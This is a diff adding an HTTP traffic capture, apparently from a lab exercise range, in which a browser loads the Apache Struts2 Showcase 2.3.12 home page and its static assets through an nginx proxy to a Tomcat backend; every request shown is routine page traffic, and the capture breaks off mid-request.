@@ -1,0 +1,3561 @@
+interface: eth0 (192.168.1.0/255.255.255.0)
+match: HTTP
+
+T 192.168.33.1:56549 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+Host: target.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Cookie: JSESSIONID=EBC84C6B41D5BF51D10A11A543B69008.
+Connection: keep-alive.
+Upgrade-Insecure-Requests: 1.
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.1.100:37876 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Cookie: JSESSIONID=EBC84C6B41D5BF51D10A11A543B69008.
+Upgrade-Insecure-Requests: 1.
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37876 [A]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Set-Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582; Path=/struts2-showcase-2.3.12; HttpOnly.
+Content-Type: text/html;charset=ISO-8859-1.
+Transfer-Encoding: chunked.
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: close.
+.
+2000.
+<!DOCTYPE html>
+
+
+
+
+
+
+<html lang="en">
+<head>
+.<meta charset="utf-8">
+.<meta name="viewport" content="width=device-width, initial-scale=1.0">
+.<meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
+.<meta name="description" content="Struts2 Showcase for Apache Struts Project">
+.<meta name="author" content="The Apache Software Foundation">
+
+.<title>Struts2 Showcase</title>
+
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap-responsive.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/main.css" rel="stylesheet" type="text/css"
+.      media="all"/>
+
+.<script src="/struts2-showcase-2.3.12/js/jquery-1.8.2.min.js"></script>
+.<script src="/struts2-showcase-2.3.12/js/bootstrap.min.js"></script>
+.<script type="text/javascript">
+..$(function () {
+...$('.dropdown-toggle').dropdown();
+...var alerts = $('ul.alert').wrap('<div />');
+...alerts.prepend('<a class="close" data-dismiss="alert" href="#">&times;</a>');
+...alerts.alert();
+..});
+.</script>
+
+.<!-- Prettify -->
+.<link href="/struts2-showcase-2.3.12/styles/prettify.css" rel="stylesheet">
+.<script src="/struts2-showcase-2.3.12/js/prettify.js"></script>
+
+.<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+.<!--[if lt IE 9]>
+.<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+.<![endif]-->
+
+.<script src="/struts2-showcase-2.3.12/struts/utils.js" type="text/javascript"></script>
+</head>
+
+<body id="page-home" onload="prettyPrint();">
+
+<div class="navbar navbar-fixed-top">
+.<div class="navbar-inner">
+..<div class="container-fluid">
+...<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+...</a>
+...<a href="/struts2-showcase-2.3.12/showcase.jsp" class="brand">Struts2 Showcase</a>
+...<div class="nav-collapse">
+....<ul class="nav">
+.....<li><a href="/struts2-showcase-2.3.12/showcase.jsp"><i class="icon-home"></i> Home</a></li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Configuration<b
+........class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/actionchaining/actionChain1!input.action">Action Chaining</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/config-browser/index.action">Config Browser</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/conversion/index.jsp">Conversion</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/person/index.jsp">Person Manager ( by Conventions )</a></li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Tags<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Non UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionTag/showActionTagDemo.action">Action Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/date.jsp">Date Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/debugTagDemo.action">Debug Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/iteratorGeneratorTag/showGeneratorTagDemo.action">Iterator Generator Tag</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/appendIteratorTag/showAppendTagDemo.action">Append Iterator Tag</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/mergeIteratorTag/showMergeTagDemo.action">Merge Iterator Demo</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/subsetIteratorTag/showSubsetTagDemo.action">Subset Tag</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionPrefix/actionPrefixExampleUsingFreemarker.action">Action Prefix Example (Freemarker)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagJsp.action">If Tag (JSP)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagFreemarker.action">If Tag (Freemarker)</a></li>
+........</ul>
+
+.......</li>
+.......<li class="dropdown-submenu">
+........<a href="#">UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/example!input.action">UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/exampleVelocity!input.action">UI Example (Velocity)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/lotsOfOptiontransferselect!input.action">Option Transfer Select UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/moreSelects!input.action">More Select Box UI Examples</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/treeExampleStatic.jsp">Tree Example (static)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicTreeAction.action">Tree Example (dynamic)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicAjaxTreeAction.action">Tree Example (dynamic ajax loading)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/componentTagExample.jsp">Component Tag Example</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/actionTagExample!input.action">Action Tag Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/datepicker/index.jsp">DateTime picker tag - Pick a date</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/timepicker/index.jsp">DateTime picker tag - Pick a time</a></li>
+.........
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">File<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/filedownload/index.jsp">File Download</a></li>
+.......<li class="dropdown-submenu">
+........<a href="#">File Upload</a>
+........<ul class="dropdown-menu">
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/upload.action">Single File Upload</a>
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingList.action">Multiple File Upload (List)</a>
+
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingArray.action">Multiple File Upload (Array)</a>
+.........</li>
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Examples<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Hangman</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/hangman/hangmanNonAjax.action">Hangman (Non Ajax)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/hangman/hangmanAjax.action">Hangman (Ajax - Experimental)</a></li>
+........</ul>
+.......</li>
+.......<li><a href="/struts2-showcase-2.3.12/person/index.jsp">Person Manager</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/empmanager/index.jsp">CRUD</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/wait/index.jsp">Execute &amp; Wait</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/token/index.jsp">Token</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/validation/index.jsp">Validation</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/modelDriven/modelDriven.action">Model Driven</a></li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Integration<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Freemarker</a>
+........<ul class="dropdown-menu">
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/freemarker/customFreemarkerManagerDemo.action">Demo of usage of a Custom Freemarker Manager</a>
+.........</li>
+.........<.
+9ad.
+li>
+..........
+..........<a href="/struts2-showcase-2.3.12/freemarker/standardTags.action">Demo of Standard Struts Freemarker Tags</a>
+.........</li>
+........</ul>
+.......</li>
+.......<li><a href="/struts2-showc
+
+T 192.168.1.100:80 -> 192.168.33.1:56549 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Content-Type: text/html;charset=ISO-8859-1.
+Transfer-Encoding: chunked.
+Connection: keep-alive.
+Set-Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582; Path=/struts2-showcase-2.3.12; HttpOnly.
+.
+1eea.
+<!DOCTYPE html>
+
+
+
+
+
+
+<html lang="en">
+<head>
+.<meta charset="utf-8">
+.<meta name="viewport" content="width=device-width, initial-scale=1.0">
+.<meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
+.<meta name="description" content="Struts2 Showcase for Apache Struts Project">
+.<meta name="author" content="The Apache Software Foundation">
+
+.<title>Struts2 Showcase</title>
+
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap-responsive.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/main.css" rel="stylesheet" type="text/css"
+.      media="all"/>
+
+.<script src="/struts2-showcase-2.3.12/js/jquery-1.8.2.min.js"></script>
+.<script src="/struts2-showcase-2.3.12/js/bootstrap.min.js"></script>
+.<script type="text/javascript">
+..$(function () {
+...$('.dropdown-toggle').dropdown();
+...var alerts = $('ul.alert').wrap('<div />');
+...alerts.prepend('<a class="close" data-dismiss="alert" href="#">&times;</a>');
+...alerts.alert();
+..});
+.</script>
+
+.<!-- Prettify -->
+.<link href="/struts2-showcase-2.3.12/styles/prettify.css" rel="stylesheet">
+.<script src="/struts2-showcase-2.3.12/js/prettify.js"></script>
+
+.<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+.<!--[if lt IE 9]>
+.<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+.<![endif]-->
+
+.<script src="/struts2-showcase-2.3.12/struts/utils.js" type="text/javascript"></script>
+</head>
+
+<body id="page-home" onload="prettyPrint();">
+
+<div class="navbar navbar-fixed-top">
+.<div class="navbar-inner">
+..<div class="container-fluid">
+...<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+...</a>
+...<a href="/struts2-showcase-2.3.12/showcase.jsp" class="brand">Struts2 Showcase</a>
+...<div class="nav-collapse">
+....<ul class="nav">
+.....<li><a href="/struts2-showcase-2.3.12/showcase.jsp"><i class="icon-home"></i> Home</a></li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Configuration<b
+........class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/actionchaining/actionChain1!input.action">Action Chaining</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/config-browser/index.action">Config Browser</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/conversion/index.jsp">Conversion</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/person/index.jsp">Person Manager ( by Conventions )</a></li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Tags<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Non UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionTag/showActionTagDemo.action">Action Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/date.jsp">Date Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/debugTagDemo.action">Debug Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/iteratorGeneratorTag/showGeneratorTagDemo.action">Iterator Generator Tag</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/appendIteratorTag/showAppendTagDemo.action">Append Iterator Tag</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/mergeIteratorTag/showMergeTagDemo.action">Merge Iterator Demo</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/subsetIteratorTag/showSubsetTagDemo.action">Subset Tag</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionPrefix/actionPrefixExampleUsingFreemarker.action">Action Prefix Example (Freemarker)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagJsp.action">If Tag (JSP)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagFreemarker.action">If Tag (Freemarker)</a></li>
+........</ul>
+
+.......</li>
+.......<li class="dropdown-submenu">
+........<a href="#">UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/example!input.action">UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/exampleVelocity!input.action">UI Example (Velocity)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/lotsOfOptiontransferselect!input.action">Option Transfer Select UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/moreSelects!input.action">More Select Box UI Examples</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/treeExampleStatic.jsp">Tree Example (static)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicTreeAction.action">Tree Example (dynamic)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicAjaxTreeAction.action">Tree Example (dynamic ajax loading)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/componentTagExample.jsp">Component Tag Example</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/actionTagExample!input.action">Action Tag Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/datepicker/index.jsp">DateTime picker tag - Pick a date</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/timepicker/index.jsp">DateTime picker tag - Pick a time</a></li>
+.........
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">File<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/filedownload/index.jsp">File Download</a></li>
+.......<li class="dropdown-submenu">
+........<a href="#">File Upload</a>
+........<ul class="dropdown-menu">
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/upload.action">Single File Upload</a>
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingList.action">Multiple File Upload (List)</a>
+
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingArray.action">Multiple File Upload (Array)</a>
+.........</li>
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Examples<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Hangman</a>
+........<ul class="dropdown-menu">
+.........<li><a hre
+
+T 192.168.33.1:56550 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/styles/bootstrap-responsive.css HTTP/1.1.
+Host: target.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/css,*/*;q=0.1.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+Connection: keep-alive.
+If-Modified-Since: Wed, 06 Mar 2013 11:47:04 GMT.
+If-None-Match: W/"20999-1362570424000".
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.33.1:56551 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/styles/bootstrap.css HTTP/1.1.
+Host: target.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/css,*/*;q=0.1.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+Connection: keep-alive.
+If-Modified-Since: Wed, 06 Mar 2013 11:47:04 GMT.
+If-None-Match: W/"118128-1362570424000".
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.1.100:37877 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/styles/bootstrap-responsive.css HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/css,*/*;q=0.1.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+If-Modified-Since: Wed, 06 Mar 2013 11:47:04 GMT.
+If-None-Match: W/"20999-1362570424000".
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.1.100:37878 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/styles/bootstrap.css HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/css,*/*;q=0.1.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+If-Modified-Since: Wed, 06 Mar 2013 11:47:04 GMT.
+If-None-Match: W/"118128-1362570424000".
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.33.1:56552 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/styles/main.css HTTP/1.1.
+Host: target.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/css,*/*;q=0.1.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+Connection: keep-alive.
+If-Modified-Since: Wed, 06 Mar 2013 11:47:04 GMT.
+If-None-Match: W/"285-1362570424000".
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.33.1:56553 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/js/jquery-1.8.2.min.js HTTP/1.1.
+Host: target.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: */*.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+Connection: keep-alive.
+If-Modified-Since: Wed, 06 Mar 2013 11:47:08 GMT.
+If-None-Match: W/"93436-1362570428000".
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.33.1:56554 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/js/bootstrap.min.js HTTP/1.1.
+Host: target.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: */*.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+Connection: keep-alive.
+If-Modified-Since: Wed, 06 Mar 2013 11:47:08 GMT.
+If-None-Match: W/"25563-1362570428000".
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.1.100:37879 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/styles/main.css HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/css,*/*;q=0.1.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+If-Modified-Since: Wed, 06 Mar 2013 11:47:04 GMT.
+If-None-Match: W/"285-1362570424000".
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.1.100:37880 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/js/jquery-1.8.2.min.js HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: */*.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+If-Modified-Since: Wed, 06 Mar 2013 11:47:08 GMT.
+If-None-Match: W/"93436-1362570428000".
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.1.100:37881 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/js/bootstrap.min.js HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: */*.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+If-Modified-Since: Wed, 06 Mar 2013 11:47:08 GMT.
+If-None-Match: W/"25563-1362570428000".
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37878 [AP]
+HTTP/1.1 304 Not Modified.
+Server: Apache-Coyote/1.1.
+ETag: W/"118128-1362570424000".
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: close.
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.1:56551 [AP]
+HTTP/1.1 304 Not Modified.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: keep-alive.
+ETag: W/"118128-1362570424000".
+.
+
+
+T 192.168.33.1:56551 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/styles/prettify.css HTTP/1.1.
+Host: target.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/css,*/*;q=0.1.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+Connection: keep-alive.
+If-Modified-Since: Wed, 06 Mar 2013 11:47:04 GMT.
+If-None-Match: W/"675-1362570424000".
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.1.100:37882 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/styles/prettify.css HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/css,*/*;q=0.1.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+If-Modified-Since: Wed, 06 Mar 2013 11:47:04 GMT.
+If-None-Match: W/"675-1362570424000".
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37879 [AP]
+HTTP/1.1 304 Not Modified.
+Server: Apache-Coyote/1.1.
+ETag: W/"285-1362570424000".
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: close.
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.1:56552 [AP]
+HTTP/1.1 304 Not Modified.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:45:56 GMT.
+Connection: keep-alive.
+ETag: W/"285-1362570424000".
+.
+
+
+T 192.168.33.1:56552 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/js/prettify.js HTTP/1.1.
+Host: target.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: */*.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/struts2-showcase-2.3.12/index.action.
+Cookie: JSESSIONID=91ECFAC8B8E96C2558AD7DAD04586582.
+Connection: keep-alive.
+If-Modified-Since: Wed, 06 Mar 2013 11:47:08 GMT.
+If-None-Match: W/"13632-1362570428000".
+Cache-Control: max-age=0.
+.
+
+
+T 192.168.1.100:37883 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/js/prettify.js HTTP/1.1.
